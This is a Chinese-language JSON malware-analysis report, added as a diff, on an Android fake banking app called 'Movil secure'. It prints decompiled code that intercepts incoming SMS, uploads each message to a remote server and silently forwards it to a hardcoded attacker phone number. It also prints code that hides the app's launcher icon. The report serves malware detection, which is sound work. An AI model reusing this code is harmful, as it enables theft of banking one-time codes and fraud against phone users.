@@ -1,0 +1,87 @@
+{
+  "APK信息": {
+    "文件名": "b168e64a02c3aed52b0c6f77a380420dd2495c3440c85a3b7ed99b8ac871d46a.apk",
+    "sha256": "b168e64a02c3aed52b0c6f77a380420dd2495c3440c85a3b7ed99b8ac871d46a",
+    "包名": "secure.movilsecure.com.movilsecure",
+    "应用名": "Movil secure",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 136.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsecure\\movilsecure\\com\\movilsecure\\MyService2;",
+          "method_signature": "for(Object obj : (Object[])",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "for (Object obj : (Object[]) extras.get(\"pdus\")) {\n    SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n    String originatingAddress = smsMessageCreateFromPdu.getOriginatingAddress();\n    String string = smsMessageCreateFromPdu.getMessageBody().toString();\n    MyService2.this.Gbody = string;\n    MyService2.this.Gsender = originatingAddress;\n    MyService2.this.new SendPostRequest1().execute(new ArrayList[0]);\n    SmsManager.getDefault().sendTextMessage(\"00212660887374\", null, string, null, null);\n}",
+          "malicious_code_snippet_context": "                  if (extras == null) {\n                      return;\n                  }\n>>>                 for (Object obj : (Object[]) extras.get(\"pdus\")) {\n>>>                     SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n>>>                     String originatingAddress = smsMessageCreateFromPdu.getOriginatingAddress();\n>>>                     String string = smsMessageCreateFromPdu.getMessageBody().toString();\n>>>                     MyService2.this.Gbody = string;\n>>>                     MyService2.this.Gsender = originatingAddress;\n>>>                     MyService2.this.new SendPostRequest1().execute(new ArrayList[0]);\n>>>                     SmsManager.getDefault().sendTextMessage(\"00212660887374\", null, string, null, null);\n>>>                 }\n                  return;\n              }\n              action.equals(\"android.intent.action.PHONE_STATE\");",
+          "behavior_description": "该代码位于短信广播接收器中，拦截用户收到的短信：解析PDU数据获取发件人号码和短信正文，先将短信内容通过HTTP请求（SendPostRequest1）上传到远程服务器，随后调用SmsManager.getDefault().sendTextMessage()在无任何用户交互的情况下，将短信原文静默转发到硬编码的攻击者号码00212660887374（+212为摩洛哥区号）。数据流向为：短信广播拦截→解析短信内容→静默转发至攻击者号码+上传远程服务器。该行为可窃取银行验证码（OTP/mTAN）等敏感短信，配合假银行应用实施SMiShing诈骗，直接造成用户财产损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsecure\\movilsecure\\com\\movilsecure\\MainActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "          super.onCreate(bundle);\n          ActivityCompat.requestPermissions(this, new String[]{\"android.permission.RECEIVE_SMS\", \"android.permission.READ_PHONE_STATE\", \"android.permission.SEND_SMS\"}, this.MY_PERMISSIONS_REQUEST_SMS_RECEIVE);\n          setContentView(R.layout.activity_main);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) MainActivity.class), 2, 1);\n          startService(new Intent(getApplicationContext(), (Class<?>) MyService2.class));\n      }\n  ",
+          "behavior_description": "在 MainActivity.onCreate() 中，应用首次启动时立即调用 PackageManager.setComponentEnabledSetting()，将自身主 Activity 组件设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED，参数 1 = DONT_KILL_APP），使应用图标从启动器中消失，用户无法看到也无法正常卸载该应用；与此同时通过 startService 启动 MyService2 后台服务继续驻留运行。数据流向：应用自身组件信息（MainActivity 的 ComponentName）→ setComponentEnabledSetting() 危险操作（禁用主组件实现图标隐藏）。这是恶意软件典型的隐匿持久化手法，结合该样本为虚假银行应用（Movil Secure SMiShing 攻击）的背景，隐藏图标可避免用户察觉异常并卸载，为后续短信欺诈行为提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
